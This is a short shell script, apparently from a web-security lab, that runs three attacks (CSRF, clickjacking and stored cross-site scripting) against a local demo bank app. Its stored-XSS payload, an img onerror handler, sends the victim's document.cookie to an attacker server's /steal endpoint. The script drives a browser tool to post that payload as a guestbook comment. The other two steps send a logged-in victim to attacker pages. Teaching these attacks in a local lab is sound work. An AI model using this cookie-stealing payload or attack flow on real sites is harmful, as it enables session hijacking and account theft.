# file: project/attack.sh
# Runs the three attacks against the bank, as a logged-in victim would experience them.
P="python3 ../../tools/page.py"
PAYLOAD='<img src=x onerror="new Image().src=`http://127.0.0.1:8131/steal?c=`+document.cookie">'
echo "--- 1. CSRF: the logged-in victim visits the attacker's page"
$P http://localhost:8130/login "eval:void (location.href = 'http://127.0.0.1:8131/csrf')" wait:800
echo "--- 2. clickjacking: the attacker frames the bank"
$P http://localhost:8130/login "eval:void (location.href = 'http://127.0.0.1:8131/frame')" wait:800
echo "--- 3. stored XSS: the attacker posts a comment, the victim views the guestbook"
$P http://localhost:8130/login "fill:input[name=text]|$PAYLOAD" "click:text=Post" wait:500 "eval:document.getElementById('comments').lastElementChild.innerHTML"
